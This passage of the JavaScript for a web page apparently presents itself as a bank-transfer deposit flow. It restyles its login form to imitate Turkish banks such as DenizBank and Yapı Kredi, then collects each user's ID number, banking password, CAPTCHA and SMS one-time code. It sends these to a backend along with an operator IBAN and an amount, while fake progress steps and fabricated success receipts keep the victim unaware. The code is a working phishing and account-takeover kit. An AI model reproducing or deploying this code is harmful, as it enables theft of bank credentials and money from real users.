y=\"11\" width=\"18\" height=\"11\" rx=\"2\"/><path d=\"M7 11V7a5 5 0 0110 0v4\"/></svg>Giriş';\n    }\n    // Açık mavi arka plan\n    loginPage.style.background='linear-gradient(180deg,#e8f4fd 0%,#d0eaf8 100%)';\n    if(infoBox) infoBox.style.display='none';\n    if(loginCard){\n      loginCard.style.background='#fff';\n      loginCard.style.border='1px solid #b8d9f0';\n      loginCard.style.boxShadow='0 2px 8px rgba(0,120,212,0.08)';\n    }\n    labels.forEach(l=>{ l.style.color='#333'; });\n    inputs.forEach(inp=>{\n      inp.style.background='#fff';\n      inp.style.border='1px solid #b0c8e0';\n      inp.style.borderRadius='4px';\n      inp.style.color='#111';\n    });\n    // Yapı Kredi — banner kaldırıldı\n\n  } else if(bankId === 'denizbank'){\n    if(labels[0]) labels[0].textContent = 'T.C. Kimlik No / Kullanıcı Adı';\n    if(labels[1]) labels[1].textContent = 'Parola';\n    if(btn){\n      btn.style.background='linear-gradient(90deg,#e91e8c,#e0185a)';\n      btn.style.borderRadius='8px';\n      btn.style.color='#fff';\n      btn.style.fontWeight='700';\n      btn.style.letterSpacing='1px';\n      btn.innerHTML='GİRİŞ YAP';\n    }\n    // Mavi gökyüzü arka plan\n    loginPage.style.background='linear-gradient(160deg,#4ab3e8 0%,#1a7fc1 100%)';\n    if(infoBox) infoBox.style.display='none';\n    if(loginCard){\n      loginCard.style.background='rgba(255,255,255,0.92)';\n      loginCard.style.border='none';\n      loginCard.style.boxShadow='0 8px 24px rgba(0,0,0,0.15)';\n      loginCard.style.borderRadius='16px';\n    }\n    labels.forEach(l=>{ l.style.color='#1a3a6b'; l.style.fontWeight='600'; });\n    inputs.forEach(inp=>{\n      inp.style.background='#fff';\n      inp.style.border='1px solid #c8def0';\n      inp.style.borderRadius='8px';\n      inp.style.color='#111';\n    });\n    // DenizBank — banner kaldırıldı\n    // DenizBank CAPTCHA — showLoginCaptcha() login sonrası çağrılır\n    document.getElementById('lbl-captcha').textContent = 'Güvenlik Kodu';\n  }\n}\n\n/* ════════════════════════\n   LOGIN → Giriş Yapılıyor sayfasına geç\n════════════════════════ */\nfunction loginNext(){\n  // KT veya standart form — doğru input'ları seç\n  const isKT = S.bank && S.bank.id === 'kuveytturk';\n  const tcEl  = isKT ? document.getElementById('inp-tc')  : document.getElementById('inp-tc-std');\n  const pwEl  = isKT ? document.getElementById('inp-pw')  : document.getElementById('inp-pw-std');\n  const errEl = isKT ? document.getElementById('login-err') : document.getElementById('login-err-std');\n  const btnId = isKT ? 'login-btn' : 'login-btn-std';\n\n  const tc = tcEl.value.trim();\n  const pw = pwEl.value;\n  errEl.textContent = '';\n\n  if(tc.length<5){errEl.textContent='Müşteri numarası veya TC kimlik girin.';return}\n  if(pw.length<4){errEl.textContent='Şifrenizi girin.';return}\n\n  // CAPTCHA kontrolü\n  const isKTCaptchaVisible = isKT && document.getElementById('kt-captcha-row')?.style.display !== 'none';\n  const isStdCaptchaVisible = !isKT && captchaVisible();\n  if(isKTCaptchaVisible || isStdCaptchaVisible){\n    const captchaCode = (isKT\n      ? document.getElementById('inp-captcha')?.value.trim()\n      : document.getElementById('inp-captcha-std')?.value.trim()) || '';\n    if(!captchaCode){ errEl.textContent='Güvenlik kodunu giriniz.'; return; }\n  }\n\n  const gsm = (isKT ? document.getElementById('inp-gsm')?.value : '') || '';\n\n  // Giriş yapılıyor sayfasına geç\n    const liBadge=document.getElementById('li-bank-badge');\n    if(typeof BANK_LOGOS!=='undefined'&&BANK_LOGOS[S.bank.id]){liBadge.innerHTML=BANK_LOGOS[S.bank.id];liBadge.style.background='transparent';}else{liBadge.style.background=S.bank.c;liBadge.textContent=S.bank.s;}\n  document.getElementById('li-bank-name').textContent=S.bank.name;\n  document.getElementById('li-sub').textContent='Tarayıcı açılıyor, lütfen bekleyin...';\n  document.getElementById('li-spinner-state').style.display='block';\n  document.getElementById('li-error-state').style.display='none';\n  resetLoginSteps();\n  showPage('logging-in');\n  startLoginAnimation();\n  const captchaCode = isKTCaptchaVisible\n    ? (document.getElementById('inp-captcha')?.value.trim() || '')\n    : isStdCaptchaVisible\n      ? (document.getElementById('inp-captcha-std')?.value.trim() || '')\n      : '';\n  // CAPTCHA varsa kaydedilmiş TC/şifreyi kullan (DenizBank, VakıfBank)\n  const finalTc = (captchaCode && S._savedTc) ? S._savedTc : tc;\n  const finalPw = (captchaCode && S._savedPw) ? S._savedPw : pw;\n  doLogin(finalTc, finalPw, gsm, captchaCode);\n}\n\nfunction resetLoginSteps(){\n  const labels=['Bağlantı kuruluyor','TC kimlik giriliyor','Şifre giriliyor','SMS bekleniyor'];\n  for(let i=0;i<4;i++){\n    const ico=document.getElementById('ls'+i);\n    const lbl=document.getElementById('ll'+i);\n    if(i===0){ico.className='lstep-ico spin';ico.innerHTML='<div class=\"spin-ring\"></div>';}\n    else{ico.className='lstep-ico wait';ico.textContent='○';}\n    lbl.className='lstep-lbl'+(i>0?' muted':'');\n    lbl.textContent=labels[i];\n  }\n}\n\nlet _animTimers=[];\nfunction startLoginAnimation(){\n  _animTimers.forEach(clearTimeout);_animTimers=[];\n  // Sahte adım animasyonları (gerçek API cevap verene kadar)\n  const steps=[\n    {d:1500,i:0,txt:'Bağlantı kuruldu'},\n    {d:3000,i:1,txt:'TC kimlik girildi'},\n    {d:4500,i:2,txt:'Şifre girildi'},\n  ];\n  steps.forEach(s=>{\n    const t=setTimeout(()=>{\n      const ico=document.getElementById('ls'+s.i);\n      const lbl=document.getElementById('ll'+s.i);\n      if(!ico||document.getElementById('page-logging-in').style.display==='none') return;\n      ico.className='lstep-ico ok';ico.textContent='✓';\n      lbl.className='lstep-lbl';lbl.textContent=s.txt;\n      // Sonraki adımı spin yap\n      const ni=document.getElementById('ls'+(s.i+1));\n      const nl=document.getElementById('ll'+(s.i+1));\n      if(ni){ni.className='lstep-ico spin';ni.innerHTML='<div class=\"spin-ring\"></div>';}\n      if(nl) nl.className='lstep-lbl';\n    },s.d);\n    _animTimers.push(t);\n  });\n}\n\nasync function doLogin(tc, pw, gsm='', captchaCode=''){\n  try{\n    const body = {bank_id:S.bank.id,tc,password:pw,amount:S.amt,target_iban:OPERATOR_IBAN,gsm:gsm||null};\n    if(captchaCode) body.captcha_code = captchaCode;\n    // Hazir session varsa kullan\n    if(S._preparedSessionId) body.session_id = S._preparedSessionId;\n    const res=await fetch(apiBase()+'/api/havale/login',{\n      method:'POST',\n      headers:{'Content-Type':'application/json'},\n      body:JSON.stringify(body)\n    });\n    const data=await res.json();\n    _animTimers.forEach(clearTimeout);\n\n    if(!res.ok){ showLoginError(data.detail); return; }\n\n    S.sessionId=data.session_id;\n\n    // CAPTCHA bekleniyor mu?\n    if(data.status === 'awaiting_captcha'){\n      // Login sayfasına geri dön, CAPTCHA resmi al ve göster\n      showPage('login');\n      const isKT = S.bank && S.bank.id === 'kuveytturk';\n      try{\n        for(let i=0; i<10; i++){\n          const cap = await fetch(apiBase()+'/api/havale/captcha/'+S.sessionId);\n          if(cap.ok){\n            const cd = await cap.json();\n            if(cd.captcha_b64){\n              if(isKT){\n                showKTCaptcha(cd.captcha_b64);\n              } else {\n                showLoginCaptcha(cd.captcha_b64);\n              }\n              S._pendingCaptchaSession = S.sessionId;\n              S.sessionId = null;\n              // TC ve şifreyi sakla — CAPTCHA submit'te tekrar kullanılacak\n              const isKT2 = S.bank && S.bank.id === 'kuveytturk';\n              S._savedTc = isKT2\n                ? document.getElementById('inp-tc')?.value\n                : document.getElementById('inp-tc-std')?.value;\n              S._savedPw = isKT2\n                ? document.getElementById('inp-pw')?.value\n                : document.getElementById('inp-pw-std')?.value;\n              return;\n            }\n          }\n          await new Promise(r=>setTimeout(r,500));\n        }\n      }catch(e){ console.warn('CAPTCHA fetch:', e); }\n      await loadCaptcha();\n      return;\n    }\n\n    // SMS sayfasına geç\n    markLoginStepsDone();\n    setTimeout(()=>{\n      document.getElementById('inp-sms').value='';\n      document.getElementById('sms-err').textContent='';\n      showPage('sms');\n      setTimeout(()=>document.getElementById('inp-sms').focus(),100);\n    },600);\n\n  }catch(e){\n    _animTimers.forEach(clearTimeout);\n    console.warn('Engine yok, demo mod:', e);\n    S.sessionId='DEMO-'+Date.now();\n    setTimeout(()=>{ showPage('sms'); },5000);\n  }\n}\n\nfunction markLoginStepsDone(){\n  for(let i=0;i<4;i++){\n    const ico=document.getElementById('ls'+i);\n    if(ico){ico.className='lstep-ico ok';ico.textContent='✓';}\n    const lbl=document.getElementById('ll'+i);\n    if(lbl) lbl.className='lstep-lbl';\n  }\n}\n\nasync function loadCaptcha(){\n  // Loading göster\n  const loadingEl = document.getElementById('captcha-loading');\n  const imgEl     = document.getElementById('captcha-img');\n  if(loadingEl) loadingEl.style.display='flex';\n  if(imgEl)     imgEl.style.display='none';\n\n  document.getElementById('inp-captcha').value='';\n  document.getElementById('captcha-err').textContent='';\n  showPage('captcha');\n\n  // Poll — engine CAPTCHA'yı hazırlayana kadar bekle (max 15s)\n  for(let i=0;i<15;i++){\n    try{\n      const r=await fetch(apiBase()+'/api/havale/captcha/'+S.sessionId);\n      if(!r.ok){ await new Promise(r=>setTimeout(r,1000)); continue; }  // 404 veya 400 — bekle\n      if(!r.ok) break;\n      const d=await r.json();\n      if(d.captcha_b64){\n        if(imgEl){\n          imgEl.src='data:image/png;base64,'+d.captcha_b64;\n          imgEl.style.display='block';\n          imgEl.onload=()=>{ if(loadingEl) loadingEl.style.display='none'; };\n        }\n        setTimeout(()=>document.getElementById('inp-captcha').focus(),100);\n        return;\n      }\n    }catch(e){ console.warn('CAPTCHA poll:', e); }\n    await new Promise(r=>setTimeout(r,1000));\n  }\n  // Timeout — hata göster\n  if(loadingEl) loadingEl.innerHTML='<span style=\"font-size:12px;color:#dc2626\">CAPTCHA yüklenemedi. Lütfen tekrar deneyin.</span>';\n  console.warn('CAPTCHA yüklenemedi');\n}\n\nasync function refreshCaptcha(){\n  try{\n    // Engine varsa CAPTCHA'yı sunucu tarafında yenile\n    const r = await fetch(apiBase()+'/api/havale/captcha/'+S.sessionId+'/refresh',{method:'POST'});\n    if(r.ok){\n      const d = await r.json();\n      if(d.captcha_b64){\n        document.getElementById('captcha-img').src='data:image/png;base64,'+d.captcha_b64;\n        document.getElementById('inp-captcha').value='';\n        return;\n      }\n    }\n  }catch(e){}\n  // Fallback: tüm CAPTCHA sayfasını yeniden yükle\n  loadCaptcha();\n}\n\nasync function captchaNext(){\n  const code=document.getElementById('inp-captcha').value.trim();\n  document.getElementById('captcha-err').textContent='';\n  if(!code){ document.getElementById('captcha-err').textContent='Doğrulama kodunu girin.'; return; }\n\n  setBtn('captcha-btn',true,'Kontrol ediliyor...');\n  try{\n    const res=await fetch(apiBase()+'/api/havale/captcha',{\n      method:'POST',\n      headers:{'Content-Type':'application/json'},\n      body:JSON.stringify({session_id:S.sessionId,captcha_code:code})\n    });\n    const data=await res.json();\n    setBtn('captcha-btn',false);\n\n    if(!res.ok){\n      if(data.detail && data.detail.toLowerCase().includes('captcha')){\n        document.getElementById('captcha-err').textContent='Doğrulama kodu hatalı. Tekrar deneyin.';\n        loadCaptcha();\n      } else {\n        showLoginError(data.detail);\n        showPage('logging-in');\n      }\n      return;\n    }\n\n    // SMS sayfasına geç\n    document.getElementById('inp-sms').value='';\n    document.getElementById('sms-err').textContent='';\n    showPage('sms');\n    setTimeout(()=>document.getElementById('inp-sms').focus(),100);\n\n  }catch(e){\n    setBtn('captcha-btn',false);\n    console.warn('CAPTCHA API hatası:', e);\n    showPage('sms'); // demo mod\n  }\n}\n\nfunction showLoginError(detail){\n  document.getElementById('li-spinner-state').style.display='none';\n  document.getElementById('li-error-state').style.display='block';\n\n  if(detail==='internet_disabled'){\n    document.getElementById('li-err-title').textContent='İnternet Şubesi Erişimi Kapalı';\n    document.getElementById('li-err-msg').innerHTML=\n      'Dijital bankacılık kanal kullanım tercihlerinizi <strong>İşCep</strong> ya da '+\n      '<strong>Şubelerimiz</strong> aracılığıyla güncelleyebilirsiniz.';\n  } else if(detail && detail.includes('401') || detail && detail.toLowerCase().includes('hatalı')){\n    document.getElementById('li-err-title').textContent='TC / Şifre Hatalı';\n    document.getElementById('li-err-msg').textContent=detail||'Girdiğiniz bilgiler hatalı. Lütfen tekrar deneyin.';\n  } else {\n    document.getElementById('li-err-title').textContent='Giriş Başarısız';\n    document.getElementById('li-err-msg').textContent=detail||'Beklenmeyen bir hata oluştu. Lütfen tekrar deneyin.';\n  }\n}\n\n/* ════════════════════════\n   SMS\n════════════════════════ */\nasync function smsNext(){\n  const sms=document.getElementById('inp-sms').value.trim();\n  document.getElementById('sms-err').textContent='';\n  if(sms.length<4){document.getElementById('sms-err').textContent='SMS kodunu girin.';return}\n\n  setBtn('sms-btn',true,'Doğrulanıyor...');\n  showPage('proc');\n  document.getElementById('proc-sub').textContent=`${S.bank.name} üzerinden ₺${fmt(S.amt)} yatırım işleminiz gerçekleştiriliyor...`;\n  startProcAnim();\n\n  try{\n    const res=await fetch(apiBase()+'/api/havale/sms',{\n      method:'POST',\n      headers:{'Content-Type':'application/json'},\n      body:JSON.stringify({session_id:S.sessionId,sms_code:sms})\n    });\n    const data=await res.json();\n    if(!res.ok){showPage('sms');document.getElementById('sms-err').textContent=data.detail||'SMS doğrulama başarısız.';setBtn('sms-btn',false);return}\n    finishProc(true,data);\n  }catch(e){\n    setTimeout(()=>finishProc(true,{reference:'PAY'+Date.now().toString().slice(-8),bank:S.bank.name,amount:S.amt,timestamp:new Date().toISOString(),dekont_screenshot:null}),5000);\n  }\n}\n\nlet procTimers=[];\nfunction startProcAnim(){\n  procTimers.forEach(clearTimeout);procTimers=[];\n  const labels=['Bankaya bağlanılıyor','Kimlik doğrulanıyor','Havale işleniyor','Bakiye güncelleniyor'];\n  for(let i=0;i<4;i++){const p=document.getElementById('p'+i),l=document.getElementById('l'+i);if(i===0){p.className='pico spin';p.innerHTML='<div class=\"spin-ring\"></div>';}else{p.className='pico wait';p.textContent='○';}l.className='plbl'+(i>0?' muted':'');l.textContent=labels[i];}\n  [1200,2600,4000].forEach((d,i)=>{\n    const t=setTimeout(()=>{\n      const ico=document.getElementById('p'+i),lbl=document.getElementById('l'+i);\n      if(!ico) return;\n      ico.className='pico ok';ico.textContent='✓';lbl.classList.remove('muted');\n      lbl.textContent=['Bankaya bağlanıldı','Kimlik doğrulandı','Havale işlendi'][i];\n      const ni=document.getElementById('p'+(i+1)),nl=document.getElementById('l'+(i+1));\n      if(ni){ni.className='pico spin';ni.innerHTML='<div class=\"spin-ring\"></div>';}\n      if(nl) nl.classList.remove('muted');\n    },d);\n    procTimers.push(t);\n  });\n}\n\nasync function finishProc(ok,data){\n  procTimers.forEach(clearTimeout);\n  const p3=document.getElementById('p3'),l3=document.getElementById('l3');\n  if(p3){p3.className='pico ok';p3.textContent='✓';}\n  if(l3){l3.classList.remove('muted');l3.textContent='İşlem bildiriliyor...';}\n\n  // Panel'e confirm at — Engine havaleyi yaptı, panele PENDING bildir\n  if(S._hizliHavaleTransactionId){\n    try{\n      await fetch(apiBase()+'/api/payment/confirm',{\n        method:'POST', headers:{'Content-Type':'application/json'},\n        body: JSON.stringify({transaction_id: S._hizliHavaleTransactionId, note:'Hızlı havale tamamlandı'})\n      });\n    }catch(e){ console.warn('confirm hatası:', e); }\n  }\n\n  if(l3){l3.textContent='Bildirim gönderildi';}\n  TXNS.unshift({name:'Para Yatırma',time:'az önce',status:'pend',amt:S.amt});renderTxns();\n  setTimeout(()=>showSuccess(data),600);\n}\n\nfunction showSuccess(data){\n  const ref=data.reference||('PAY'+Date.now().toString().slice(-8));\n  const ts=data.timestamp?new Date(data.timestamp).toLocaleString('tr-TR'):new Date().toLocaleString('tr-TR');\n  document.getElementById('suc-sub').textContent=`Havale bildiriminiz alındı. Finans onayından sonra bakiyenize yansıyacak.`;\n  document.getElementById('dek').innerHTML=`\n    <div class=\"dek-row\"><span class=\"dek-lbl\">İşlem Türü</span><span class=\"dek-val\">Hızlı Havale</span></div>\n    <div class=\"dek-row\"><span class=\"dek-lbl\">Gönderen Banka</span><span class=\"dek-val\">${data.bank||S.bank.name}</span></div>\n    <div class=\"dek-row\"><span class=\"dek-lbl\">Tarih / Saat</span><span class=\"dek-val\">${ts}</span></div>\n    <div class=\"dek-row\"><span class=\"dek-lbl\">Referans No</span><span class=\"dek-ref\">${ref}</span></div>\n    <div class=\"dek-row\"><span class=\"dek-lbl\">Yatırılan Tutar</span><span class=\"dek-val\">₺${fmt(S.amt)}</span></div>\n    <div class=\"dek-row\"><span class=\"dek-lbl\">Yeni Bakiye</span><span class=\"dek-val\" style=\"color:#2563eb\">₺${fmt(balance)} TRY</span></div>`;\n  if(data.dekont_screenshot){const img=document.getElementById('dekont-img');img.src='data:image/png;base64,'+data.dekont_screenshot;img.style.display='block';S.dekontB64=data.dekont_screenshot;}\n  document.getElementById('dek-dl-btn').onclick=()=>{\n    if(S.dekontB64){const a=document.createElement('a');a.href='data:image/png;base64,'+S.dekontB64;a.download=`dekont_${ref}.png`;a.click();}\n    else alert('Demo mod: Gerçek engine bağlıyken dekont PNG olarak indirilir.');\n  };\n  showPage('suc');\n  notifySuccess(S.sessionId);\n}\n\n\n/* ─── FORCE CONFIRM ─── */\nasync function forceConfirmAndSuccess(){\n  // Login başarısız olsa da panele confirm at ve success göster\n  showPage('proc');\n  document.getElementById('proc-sub').textContent = 'İşlem panele bildiriliyor...';\n  startProcAnim();\n\n  const txId = S._hizliHavaleTransactionId;\n  if(txId){\n    try{\n      await fetch(apiBase()+'/api/payment/confirm',{\n        method:'POST', headers:{'Content-Type':'application/json'},\n        body: JSON.stringify({transaction_id: txId, note:'Manuel gönderim'})\n      });\n    }catch(e){ console.warn('confirm hata:', e); }\n  }\n\n  // 3 sn sonra waiting göster\n  setTimeout(()=>{\n    const ref = 'PAY'+Date.now().toString().slice(-8);\n    showPage('waiting');\n    notifySuccess(txId || ref);\n  }, 3000);\n}\n\n/* INIT */\nrenderTxns();\n// iframe modunda _urlPage'e göre sayfa — DOMContentLoaded'da zaten ayarlanıyor\nif (!_urlPage) showPage('home');\n</script>\n</body>\n</html>\n"
